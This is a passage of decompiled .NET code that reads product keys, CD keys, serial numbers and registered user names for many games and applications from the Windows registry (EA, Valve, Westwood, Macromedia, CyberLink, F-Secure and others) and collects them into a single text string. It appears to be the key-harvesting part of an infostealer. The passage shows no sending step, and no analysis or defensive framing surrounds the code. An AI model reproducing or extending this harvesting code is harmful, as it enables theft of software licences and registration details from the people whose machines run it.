					goto IL_08a4;
					IL_08a4:
					num = 145;
					text91 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2", "ergc", null));
					goto IL_08c1;
					IL_08c1:
					num = 146;
					text53 += text91;
					goto IL_08d0;
					IL_08d0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_08d7;
					IL_08d7:
					num = 148;
					text53 += "\r\nBattlefield(2142) :";
					goto IL_08e9;
					IL_08e9:
					num = 149;
					text92 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 2142", "ergc", null));
					goto IL_0906;
					IL_0906:
					num = 150;
					text53 += text92;
					goto IL_0915;
					IL_0915:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_091c;
					IL_091c:
					num = 152;
					text53 += "\r\nCamtasia Studio 6(Name) :";
					goto IL_092e;
					IL_092e:
					num = 153;
					text93 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegisteredTo", null));
					goto IL_094b;
					IL_094b:
					num = 154;
					text53 += text93;
					goto IL_095a;
					IL_095a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0961;
					IL_0961:
					num = 156;
					text53 += "\r\nCamtasia Studio 6(Key) :";
					goto IL_0973;
					IL_0973:
					num = 157;
					text94 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegistrationKey", null));
					goto IL_0990;
					IL_0990:
					num = 158;
					text53 += text94;
					goto IL_099f;
					IL_099f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_09a6;
					IL_09a6:
					num = 160;
					text53 += "\r\nChrome :";
					goto IL_09b8;
					IL_09b8:
					num = 161;
					text95 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Techland\\Chrome", "SerialNumber", null));
					goto IL_09d5;
					IL_09d5:
					num = 162;
					text53 += text95;
					goto IL_09e4;
					IL_09e4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_09eb;
					IL_09eb:
					num = 164;
					text53 += "\r\nCodec Tweak Tool :";
					goto IL_09fd;
					IL_09fd:
					num = 165;
					text96 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Codec Tweak Tool", "serial", null));
					goto IL_0a1a;
					IL_0a1a:
					num = 166;
					text53 += text96;
					goto IL_0a29;
					IL_0a29:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0a30;
					IL_0a30:
					num = 168;
					text53 += "\r\nCommand and Conquer Generals :";
					goto IL_0a42;
					IL_0a42:
					num = 169;
					text97 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Generals", "ergc", null));
					goto IL_0a5f;
					IL_0a5f:
					num = 170;
					text53 += text97;
					goto IL_0a6e;
					IL_0a6e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0a75;
					IL_0a75:
					num = 172;
					text53 += "\r\nCommand and Conquer Generals Zero Hour :";
					goto IL_0a87;
					IL_0a87:
					num = 173;
					text98 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour", "ergc", null));
					goto IL_0aa4;
					IL_0aa4:
					num = 174;
					text53 += text98;
					goto IL_0ab3;
					IL_0ab3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0aba;
					IL_0aba:
					num = 176;
					text53 += "\r\nRed Alert 2 :";
					goto IL_0acc;
					IL_0acc:
					num = 177;
					text99 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert 2", "Serial", null));
					goto IL_0ae9;
					IL_0ae9:
					num = 178;
					text53 += text99;
					goto IL_0af8;
					IL_0af8:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0aff;
					IL_0aff:
					num = 180;
					text53 += "\r\nRed Alert :";
					goto IL_0b11;
					IL_0b11:
					num = 181;
					text100 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert", "Serial", null));
					goto IL_0b2e;
					IL_0b2e:
					num = 182;
					text53 += text100;
					goto IL_0b3d;
					IL_0b3d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0b44;
					IL_0b44:
					num = 184;
					text53 += "\r\nCommand and Conquer Tiberian Sun :";
					goto IL_0b56;
					IL_0b56:
					num = 185;
					text101 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Tiberian Sun", "Serial", null));
					goto IL_0b73;
					IL_0b73:
					num = 186;
					text53 += text101;
					goto IL_0b82;
					IL_0b82:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0b89;
					IL_0b89:
					num = 188;
					text53 += "\r\nCommand and Conquer 3 :";
					goto IL_0b9b;
					IL_0b9b:
					num = 189;
					text102 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_0bb8;
					IL_0bb8:
					num = 190;
					text53 += text102;
					goto IL_0bc7;
					IL_0bc7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0bce;
					IL_0bce:
					num = 192;
					text53 += "\r\nCommand and Conquer 3 :";
					goto IL_0be0;
					IL_0be0:
					num = 193;
					text103 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Command and Conquer 3", "ergc", null));
					goto IL_0bfd;
					IL_0bfd:
					num = 194;
					text53 += text103;
					goto IL_0c0c;
					IL_0c0c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0c13;
					IL_0c13:
					num = 196;
					text53 += "\r\nCompany of Heroes :";
					goto IL_0c25;
					IL_0c25:
					num = 197;
					text104 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHProductKey", null));
					goto IL_0c42;
					IL_0c42:
					num = 198;
					text53 += text104;
					goto IL_0c51;
					IL_0c51:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0c58;
					IL_0c58:
					num = 200;
					text53 += "\r\nCompany of Heroes :";
					goto IL_0c6a;
					IL_0c6a:
					num = 201;
					text105 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company of Heroes", "CoHOFProductKey", null));
					goto IL_0c87;
					IL_0c87:
					num = 202;
					text53 += text105;
					goto IL_0c96;
					IL_0c96:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0c9d;
					IL_0c9d:
					num = 204;
					text53 += "\r\nCounter-Strike :";
					goto IL_0caf;
					IL_0caf:
					num = 205;
					text106 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Counter-Strike\\Settings", "Key", null));
					goto IL_0ccc;
					IL_0ccc:
					num = 206;
					text53 += text106;
					goto IL_0cdb;
					IL_0cdb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0ce2;
					IL_0ce2:
					num = 208;
					text53 += "\r\nCrysis :";
					goto IL_0cf4;
					IL_0cf4:
					num = 209;
					text107 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis", "ergc", null));
					goto IL_0d11;
					IL_0d11:
					num = 210;
					text53 += text107;
					goto IL_0d20;
					IL_0d20:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0d27;
					IL_0d27:
					num = 212;
					text53 += "\r\nPowerDVD :";
					goto IL_0d39;
					IL_0d39:
					num = 213;
					text108 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerDVD", "CDKey", null));
					goto IL_0d56;
					IL_0d56:
					num = 214;
					text53 += text108;
					goto IL_0d65;
					IL_0d65:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0d6c;
					IL_0d6c:
					num = 216;
					text53 += "\r\nPowerBar :";
					goto IL_0d7e;
					IL_0d7e:
					num = 217;
					text109 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerBar", "CDKey", null));
					goto IL_0d9b;
					IL_0d9b:
					num = 218;
					text53 += text109;
					goto IL_0daa;
					IL_0daa:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0db1;
					IL_0db1:
					num = 220;
					text53 += "\r\nCyberLink PowerProducer :";
					goto IL_0dc3;
					IL_0dc3:
					num = 221;
					text110 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CyberLink\\PowerProducer\\3.0\\UserReg", "SR_No", null));
					goto IL_0de0;
					IL_0de0:
					num = 222;
					text53 += text110;
					goto IL_0def;
					IL_0def:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0df6;
					IL_0df6:
					num = 224;
					text53 += "\r\nDay of Defeat :";
					goto IL_0e08;
					IL_0e08:
					num = 225;
					text111 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Day of Defeat\\Settings", "Key", null));
					goto IL_0e25;
					IL_0e25:
					num = 226;
					text53 += text111;
					goto IL_0e34;
					IL_0e34:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0e3b;
					IL_0e3b:
					num = 228;
					text53 += "\r\nThe Battle for Middle-earth II :";
					goto IL_0e4d;
					IL_0e4d:
					num = 229;
					text112 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\The Battle for Middle-earth II", "ergc", null));
					goto IL_0e6a;
					IL_0e6a:
					num = 230;
					text53 += text112;
					goto IL_0e79;
					IL_0e79:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0e80;
					IL_0e80:
					num = 232;
					text53 += "\r\nThe Sims 2 :";
					goto IL_0e92;
					IL_0e92:
					num = 233;
					text113 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2", "ergc", null));
					goto IL_0eaf;
					IL_0eaf:
					num = 234;
					text53 += text113;
					goto IL_0ebe;
					IL_0ebe:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0ec5;
					IL_0ec5:
					num = 236;
					text53 += "\r\nThe Sims 2 University :";
					goto IL_0ed7;
					IL_0ed7:
					num = 237;
					text114 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 University", "ergc", null));
					goto IL_0ef4;
					IL_0ef4:
					num = 238;
					text53 += text114;
					goto IL_0f03;
					IL_0f03:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0f0a;
					IL_0f0a:
					num = 240;
					text53 += "\r\nThe Sims 2 Nightlife :";
					goto IL_0f1c;
					IL_0f1c:
					num = 241;
					text115 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Nightlife", "ergc", null));
					goto IL_0f39;
					IL_0f39:
					num = 242;
					text53 += text115;
					goto IL_0f48;
					IL_0f48:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0f4f;
					IL_0f4f:
					num = 244;
					text53 += "\r\nThe Sims 2 Open For Business :";
					goto IL_0f61;
					IL_0f61:
					num = 245;
					text116 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Open For Business", "ergc", null));
					goto IL_0f7e;
					IL_0f7e:
					num = 246;
					text53 += text116;
					goto IL_0f8d;
					IL_0f8d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0f94;
					IL_0f94:
					num = 248;
					text53 += "\r\nThe Sims 2 Pets :";
					goto IL_0fa6;
					IL_0fa6:
					num = 249;
					text117 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Pets", "ergc", null));
					goto IL_0fc3;
					IL_0fc3:
					num = 250;
					text53 += text117;
					goto IL_0fd2;
					IL_0fd2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0fd9;
					IL_0fd9:
					num = 252;
					text53 += "\r\nThe Sims 2 Seasons :";
					goto IL_0feb;
					IL_0feb:
					num = 253;
					text118 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Seasons", "ergc", null));
					goto IL_1008;
					IL_1008:
					num = 254;
					text53 += text118;
					goto IL_1017;
					IL_1017:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_101e;
					IL_101e:
					num = 256;
					text53 += "\r\nThe Sims 2 Glamour Life Stuff :";
					goto IL_1030;
					IL_1030:
					num = 257;
					text119 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Glamour Life Stuff", "ergc", null));
					goto IL_104d;
					IL_104d:
					num = 258;
					text53 += text119;
					goto IL_105c;
					IL_105c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1063;
					IL_1063:
					num = 260;
					text53 += "\r\nThe Sims 2 Celebration Stuff :";
					goto IL_1075;
					IL_1075:
					num = 261;
					text120 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Celebration Stuff", "ergc", null));
					goto IL_1092;
					IL_1092:
					num = 262;
					text53 += text120;
					goto IL_10a1;
					IL_10a1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_10a8;
					IL_10a8:
					num = 264;
					text53 += "\r\nThe Sims 2 H M Fashion Stuff :";
					goto IL_10ba;
					IL_10ba:
					num = 265;
					text121 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 H M Fashion Stuff", "ergc", null));
					goto IL_10d7;
					IL_10d7:
					num = 266;
					text53 += text121;
					goto IL_10e6;
					IL_10e6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_10ed;
					IL_10ed:
					num = 268;
					text53 += "\r\nThe Sims 2 Family Fun Stuff :";
					goto IL_10ff;
					IL_10ff:
					num = 269;
					text122 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Family Fun Stuff", "ergc", null));
					goto IL_111c;
					IL_111c:
					num = 270;
					text53 += text122;
					goto IL_112b;
					IL_112b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1132;
					IL_1132:
					num = 272;
					text53 += "\r\nDVD Audio Extractor (Name) :";
					goto IL_1144;
					IL_1144:
					num = 273;
					text123 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Name", null));
					goto IL_1161;
					IL_1161:
					num = 274;
					text53 += text123;
					goto IL_1170;
					IL_1170:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1177;
					IL_1177:
					num = 276;
					text53 += "\r\nDVD Audio Extractor (Serial) :";
					goto IL_1189;
					IL_1189:
					num = 277;
					text124 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Number", null));
					goto IL_11a6;
					IL_11a6:
					num = 278;
					text53 += text124;
					goto IL_11b5;
					IL_11b5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_11bc;
					IL_11bc:
					num = 280;
					text53 += "\r\nEmpire Earth II :";
					goto IL_11ce;
					IL_11ce:
					num = 281;
					text125 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\Empire Earth II", "CDKey", null));
					goto IL_11eb;
					IL_11eb:
					num = 282;
					text53 += text125;
					goto IL_11fa;
					IL_11fa:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1201;
					IL_1201:
					num = 284;
					text53 += "\r\nF.E.A.R :";
					goto IL_1213;
					IL_1213:
					num = 285;
					text126 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\CDKey", "fear", null));
					goto IL_1230;
					IL_1230:
					num = 286;
					text53 += text126;
					goto IL_123f;
					IL_123f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1246;
					IL_1246:
					num = 288;
					text53 += "\r\nF-Secure :";
					goto IL_1258;
					IL_1258:
					num = 289;
					text127 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\F-Secure\\BackWeb\\iLauncher", "UID", null));
					goto IL_1275;
					IL_1275:
					num = 290;
					text53 += text127;
					goto IL_1284;
					IL_1284:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_128b;
					IL_128b:
					num = 292;
					text53 += "\r\nFARCRY :";
					goto IL_129d;
					IL_129d:
					num = 293;
					text128 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY\\UBI.COM", "CDKey", null));
					goto IL_12ba;
					IL_12ba:
					num = 294;
					text53 += text128;
					goto IL_12c9;
					IL_12c9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_12d0;
					IL_12d0:
					num = 296;
					text53 += "\r\nFARCRY 2 : ";
					goto IL_12e2;
					IL_12e2:
					num = 297;
					text129 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY2\\UBI.COM", "CDKey", null));
					goto IL_12ff;
					IL_12ff:
					num = 298;
					text53 += text129;
					goto IL_130e;
					IL_130e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1315;
					IL_1315:
					num = 300;
					text53 += "\r\nFIFA 2002 :";
					goto IL_1327;
					IL_1327:
					num = 301;
					text130 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002", "ergc", null));
					goto IL_1344;
					IL_1344:
					num = 302;
					text53 += text130;
					goto IL_1353;
					IL_1353:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_135a;
					IL_135a:
					num = 304;
					text53 += "\r\nFIFA 2003 :";
					goto IL_136c;
					IL_136c:
					num = 305;
					text131 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003", "ergc", null));
					goto IL_1389;
					IL_1389:
					num = 306;
					text53 += text131;
					goto IL_1398;
					IL_1398:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_139f;
					IL_139f:
					num = 308;
					text53 += "\r\nFIFA 2004 :";
					goto IL_13b1;
					IL_13b1:
					num = 309;
					text132 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2004", "ergc", null));
					goto IL_13ce;
					IL_13ce:
					num = 310;
					text53 += text132;
					goto IL_13dd;
					IL_13dd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_13e4;
					IL_13e4:
					num = 312;
					text53 += "\r\nFIFA 2005 :";
					goto IL_13f6;
					IL_13f6:
					num = 313;
					text133 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2005", "ergc", null));
					goto IL_1413;
					IL_1413:
					num = 314;
					text53 += text133;
					goto IL_1422;
					IL_1422:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1429;
					IL_1429:
					num = 316;
					text53 += "\r\nFIFA 07 :";
					goto IL_143b;
					IL_143b:
					num = 317;
					text134 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 07", "ergc", null));
					goto IL_1458;
					IL_1458:
					num = 318;
					text53 += text134;
					goto IL_1467;
					IL_1467:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_146e;
					IL_146e:
					num = 320;
					text53 += "\r\nFIFA 08 :";
					goto IL_1480;
					IL_1480:
					num = 321;
					text135 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\FIFA 08", "ergc", null));
					goto IL_149d;
					IL_149d:
					num = 322;
					text53 += text135;
					goto IL_14ac;
					IL_14ac:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_14b3;
					IL_14b3:
					num = 324;
					text53 += "\r\nFreedom Force :";
					goto IL_14c5;
					IL_14c5:
					num = 325;
					text136 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force", "ergc", null));
					goto IL_14e2;
					IL_14e2:
					num = 326;
					text53 += text136;
					goto IL_14f1;
					IL_14f1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_14f8;
					IL_14f8:
					num = 328;
					text53 += "\r\nFrontlines: Fuel of War Beta :";
					goto IL_150a;
					IL_150a:
					num = 329;
					text137 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War Beta", "ProductKey", null));
					goto IL_1527;
					IL_1527:
					num = 330;
					text53 += text137;
					goto IL_1536;
					IL_1536:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_153d;
					IL_153d:
					num = 332;
					text53 += "\r\nFrontlines: Fuel of War :";
					goto IL_154f;
					IL_154f:
					num = 333;
					text138 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War", "ProductKey", null));
					goto IL_156c;
					IL_156c:
					num = 334;
					text53 += text138;
					goto IL_157b;
					IL_157b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1582;
					IL_1582:
					num = 336;
					text53 += "\r\nGetRight :";
					goto IL_1594;
					IL_1594:
					num = 337;
					text139 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Headlight\\GetRight", "GRcode", null));
					goto IL_15b1;
					IL_15b1:
					num = 338;
					text53 += text139;
					goto IL_15c0;
					IL_15c0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_15c7;
					IL_15c7:
					num = 340;
					text53 += "\r\nGlobal Operations :";
					goto IL_15d9;
					IL_15d9:
					num = 341;
					text140 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations", "ergc", null));
					goto IL_15f6;
					IL_15f6:
					num = 342;
					text53 += text140;
					goto IL_1605;
					IL_1605:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_160c;
					IL_160c:
					num = 344;
					text53 += "\r\nGunman :";
					goto IL_161e;
					IL_161e:
					num = 345;
					text141 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Gunman", "Settings", null));
					goto IL_163b;
					IL_163b:
					num = 346;
					text53 += text141;
					goto IL_164a;
					IL_164a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1651;
					IL_1651:
					num = 348;
					text53 += "\r\nHalf-Life :";
					goto IL_1663;
					IL_1663:
					num = 349;
					text142 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Half-Life\\Setting", "Key", null));
					goto IL_1680;
					IL_1680:
					num = 350;
					text53 += text142;
					goto IL_168f;
					IL_168f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1696;
					IL_1696:
					num = 352;
					text53 += "\r\nHellgate: London :";
					goto IL_16a8;
					IL_16a8:
					num = 353;
					text143 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Hellgate: London", "ergc", null));
					goto IL_16c5;
					IL_16c5:
					num = 354;
					text53 += text143;
					goto IL_16d4;
					IL_16d4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_16db;
					IL_16db:
					num = 356;
					text53 += "\r\nHidden & Dangerous 2 :";
					goto IL_16ed;
					IL_16ed:
					num = 357;
					text144 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key", null));
					goto IL_170a;
					IL_170a:
					num = 358;
					text53 += text144;
					goto IL_1719;
					IL_1719:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1720;
					IL_1720:
					num = 360;
					text53 += "\r\nIGI 2 Retail :";
					goto IL_1732;
					IL_1732:
					num = 361;
					text145 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey", null));
					goto IL_174f;
					IL_174f:
					num = 362;
					text53 += text145;
					goto IL_175e;
					IL_175e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1765;
					IL_1765:
					num = 364;
					text53 += "\r\nInCD Serial :";
					goto IL_1777;
					IL_1777:
					num = 365;
					text146 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "License", null));
					goto IL_1794;
					IL_1794:
					num = 366;
					text53 += text146;
					goto IL_17a3;
					IL_17a3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_17aa;
					IL_17aa:
					num = 368;
					text53 += "\r\nInCD Username :";
					goto IL_17bc;
					IL_17bc:
					num = 369;
					text147 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "UserName", null));
					goto IL_17d9;
					IL_17d9:
					num = 370;
					text53 += text147;
					goto IL_17e8;
					IL_17e8:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_17ef;
					IL_17ef:
					num = 372;
					text53 += "\r\nIG2 :";
					goto IL_1801;
					IL_1801:
					num = 373;
					text148 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JoWooD\\InstalledGames\\IG2", "prvkey", null));
					goto IL_181e;
					IL_181e:
					num = 374;
					text53 += text148;
					goto IL_182d;
					IL_182d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1834;
					IL_1834:
					num = 376;
					text53 += "\r\niPod Converter (Registration Code) :";
					goto IL_1846;
					IL_1846:
					num = 377;
					text149 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "Registration Code", null));
					goto IL_1863;
					IL_1863:
					num = 378;
					text53 += text149;
					goto IL_1872;
					IL_1872:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1879;
					IL_1879:
					num = 380;
					text53 += "\r\niPod Converter (User Name) :";
					goto IL_188b;
					IL_188b:
					num = 381;
					text150 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "User Name", null));
					goto IL_18a8;
					IL_18a8:
					num = 382;
					text53 += text150;
					goto IL_18b7;
					IL_18b7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_18be;
					IL_18be:
					num = 384;
					text53 += "\r\nJames Bond 007 Nightfire :";
					goto IL_18d0;
					IL_18d0:
					num = 385;
					text151 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire", "ergc", null));
					goto IL_18ed;
					IL_18ed:
					num = 386;
					text53 += text151;
					goto IL_18fc;
					IL_18fc:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1903;
					IL_1903:
					num = 388;
					text53 += "\r\nStatus Legends of Might and Magic :";
					goto IL_1915;
					IL_1915:
					num = 389;
					text152 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\3d0\\Status Legends of Might and Magic", "CustomerNumber", null));
					goto IL_1932;
					IL_1932:
					num = 390;
					text53 += text152;
					goto IL_1941;
					IL_1941:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1948;
					IL_1948:
					num = 392;
					text53 += "\r\nMacromedia Flash 7 :";
					goto IL_195a;
					IL_195a:
					num = 393;
					text153 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Flash\\7\\Registration", "Serial Number", null));
					goto IL_1977;
					IL_1977:
					num = 394;
					text53 += text153;
					goto IL_1986;
					IL_1986:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_198d;
					IL_198d:
					num = 396;
					text53 += "\r\nMacromedia Fireworks 7 :";
					goto IL_199f;
					IL_199f:
					num = 397;
					text154 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Fireworks\\7\\Registration", "Serial Number", null));
					goto IL_19bc;
					IL_19bc:
					num = 398;
					text53 += text154;
					goto IL_19cb;
					IL_19cb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_19d2;
					IL_19d2:
